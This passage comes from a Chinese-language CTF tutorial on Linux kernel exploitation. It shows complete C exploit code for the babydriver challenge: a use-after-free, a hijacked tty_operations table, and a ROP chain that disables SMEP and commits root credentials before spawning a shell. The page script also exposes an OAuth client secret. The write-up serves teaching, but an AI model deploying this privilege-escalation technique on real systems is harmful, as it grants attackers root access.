hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)set_root_cred;</span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="keyword">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] privilege escape ROP prepared\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line">    <span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span>** ops_ptr_addr = (<span class="keyword">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] origin ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">    *ops_ptr_addr = (<span class="keyword">char</span>*)fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] hacked ops ptr addr: %p\n"</span>, *ops_ptr_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发 tty_write</span></span><br><span class="line">    <span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line">    <span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行效果：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211013214429834.png" alt="image-20211013214429834"></p>
<p>下面是一个简化版的 exploit:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xchg_eax_esp_addr           0xffffffff8100008a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr    0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr           0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_addr                0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_pop_rbp_addr         0xffffffff81063694          </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq_addr                  0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_root_cred</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) = commit_creds_addr;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_iret_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%cs, %0"</span> : <span class="string">"=r"</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pushf"</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"pop %0"</span> : <span class="string">"=r"</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%rsp, %0"</span> : <span class="string">"=r"</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">"mov %%ss, %0"</span> : <span class="string">"=r"</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        xchg_eax_esp_addr</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>)),</span><br><span class="line">            <span class="number">0x10000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">u_int64_t</span> rop_chain_mem[] = &#123;</span><br><span class="line">        pop_rdi_addr, <span class="number">0x6f0</span>, </span><br><span class="line">        mov_cr4_rdi_pop_rbp_addr, <span class="number">0</span>, set_root_cred,</span><br><span class="line">        swapgs_pop_rbp_addr, <span class="number">0</span>, </span><br><span class="line">        iretq_addr, get_shell, user_cs, user_eflags, user_rsp, user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(hijacked_stack_addr, rop_chain_mem, <span class="keyword">sizeof</span>(rop_chain_mem));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span>** ops_ptr_addr = overwrite_mem + ops_ptr_offset;</span><br><span class="line"></span><br><span class="line">    read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line">    *ops_ptr_addr = fake_tty_ops;</span><br><span class="line">    write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(master_fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="五、参考">五、参考</h2>
<ul>
<li><a href="https://wiki.x10sec.org/pwn/linux/kernel-mode/environment/readme/" target="_blank" rel="noopener">CTF Wiki - Linux Platform Kernel Mode</a></li>
<li><a href="https://linuxlink.timesys.com/docs/how_to_use_kgdb" target="_blank" rel="noopener">How to use KGDB - LinuxLink</a></li>
<li><a href="https://d1nn3r.github.io/2019/07/27/kernelexp/" target="_blank" rel="noopener">kernelexp学习笔记</a></li>
<li><a href="https://blog.csdn.net/m0_38100569/article/details/100673103" target="_blank" rel="noopener">【Writeup】CISCN2017_Pwn_babydriver - CSDN</a></li>
<li><em><a href="https://lwn.net/Kernel/LDD3/" target="_blank" rel="noopener">Linux Device Drivers, Third Edition - Chapter 3 Char Drivers</a></em></li>
<li><a href="https://blog.csdn.net/tq384998430/article/details/54342044" target="_blank" rel="noopener">Linux下使用class_create,device_create自动创建设备文件结点</a></li>
<li><a href="https://www.cnblogs.com/bittorrent/p/3789193.html" target="_blank" rel="noopener">Linux下tty/pty/pts/ptmx详解</a></li>
<li><a href="https://www.cnblogs.com/dux2016/articles/6236131.html" target="_blank" rel="noopener">Linux终端简介与pty编程</a></li>
<li>Linux manual page</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2021/10/kernel_pwn_introduction/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2021/11/cs144-lab0/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            CS144计算机网络 Lab0
          
        </div>
      </a>
    
    
      <a href="/2021/09/protobuf_ctf_fuzz/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">使用 protobuf &amp; AFLplusplus 进行简易 CTF 自动化 fuzz</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>